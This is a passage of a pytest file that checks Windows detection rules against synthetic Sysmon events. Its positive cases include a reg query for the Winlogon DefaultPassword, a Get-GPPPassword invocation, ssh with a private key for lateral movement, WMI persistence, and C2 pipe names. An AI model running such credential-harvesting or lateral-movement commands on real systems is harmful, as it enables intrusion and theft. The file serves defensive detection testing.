            TargetFilename=r"C:\Users\bob\Downloads\invoice.pdf",
        ),
    ),
    # --- Registry queried for an autologon or default password (SYS-186) ---
    (
        "SYS-186",
        True,
        event(
            1,
            image=r"C:\Windows\System32\reg.exe",
            command_line=r'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword',
        ),
    ),
    (
        "SYS-186",
        False,
        event(1, image=r"C:\Windows\System32\reg.exe", command_line=r'reg query "HKLM\SOFTWARE\Classes"'),
    ),
    # --- Group Policy Preferences cpassword harvested (SYS-187) ---
    (
        "SYS-187",
        True,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="Get-GPPPassword.ps1",
        ),
    ),
    (
        "SYS-187",
        False,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="Get-ADUser -Filter *",
        ),
    ),
    # --- SSH client used with a private key for lateral movement (SYS-188) ---
    (
        "SYS-188",
        True,
        event(
            1,
            image=r"C:\Windows\System32\OpenSSH\ssh.exe",
            command_line=r"ssh -i C:\keys\id_rsa admin@10.0.0.5",
        ),
    ),
    (
        "SYS-188",
        False,
        event(1, image=r"C:\Windows\System32\OpenSSH\ssh.exe", command_line="ssh admin@10.0.0.5"),
    ),
    # --- Tor or a multi-hop proxy tool launched (SYS-189) ---
    (
        "SYS-189",
        True,
        event(1, image=r"C:\Users\bob\AppData\Local\Temp\tor.exe", command_line="tor.exe"),
    ),
    (
        "SYS-189",
        False,
        event(1, image=r"C:\Windows\System32\notepad.exe", command_line="notepad.exe report.txt"),
    ),
    # --- PowerShell archived data via .NET compression, no archive tool on disk (SYS-190) ---
    (
        "SYS-190",
        True,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="[System.IO.Compression.ZipFile]::CreateFromDirectory($src,$dst)",
        ),
    ),
    (
        "SYS-190",
        False,
        event(
            1,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="Get-Process",
        ),
    ),
    # --- Sysmon configuration reloaded (SYS-191) ---
    ("SYS-191", True, event(16, ConfigurationFileHash="SHA1=1A2B3C4D5E")),
    ("SYS-191", False, event(16, ConfigurationFileHash="")),
    # --- WMI event filter registered (SYS-192) ---
    (
        "SYS-192",
        True,
        event(19, Name="EvilFilter", Query="SELECT * FROM __InstanceCreationEvent"),
    ),
    ("SYS-192", False, event(19, Name="")),
    # --- WMI filter bound to a consumer (SYS-193) ---
    (
        "SYS-193",
        True,
        event(21, Consumer='CommandLineEventConsumer="Evil"', Filter="EvilFilter"),
    ),
    ("SYS-193", False, event(21, Consumer="")),
    # --- Named pipe connected matching a known C2/lateral-movement signature
    # (SYS-194) -- same pipe-name patterns as SYS-060/SYS-072, on the Connected
    # event rather than Created. ---
    ("SYS-194", True, event(18, PipeName=r"\msagent_4f")),
    ("SYS-194", True, event(18, PipeName=r"\PSEXESVC")),
    ("SYS-194", False, event(18, PipeName=r"\lsass")),
    # --- Clipboard accessed by a scripting engine or LOLBIN (SYS-195) ---
    (
        "SYS-195",
        True,
        event(24, image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
    ),
    ("SYS-195", False, event(24, image=r"C:\Windows\explorer.exe")),
    # --- Persistence-relevant registry key renamed (SYS-196) ---
    (
        "SYS-196",
        True,
        event(
            14,
            EventType="RenameKey",
            TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\evil",
        ),
    ),
    (
        "SYS-196",
        False,
        event(
            14,
            EventType="RenameKey",
            TargetObject=r"HKCU\SOFTWARE\SomeApp\Settings\Theme",
        ),
    ),
]


@pytest.mark.parametrize("rule_id, should_fire, evt", CASES)
def test_rule_fires_as_expected(rules, rule_id, should_fire, evt) -> None:
    rule = rules.get(rule_id)
    assert rule is not None, f"{rule_id} is not in the loaded corpus"
    fired = bool(evaluate(evt, [rule]))
    assert fired == should_fire


def test_every_rule_has_a_test_case(rules) -> None:
    """Guardrail: a rule added without a validation case is a coverage gap. This
    fails the moment someone ships a rule and forgets to prove it fires."""
    tested = {rule_id for rule_id, _, _ in CASES}
    untested = set(rules) - tested
    assert not untested, f"rules with no validation case: {sorted(untested)}"
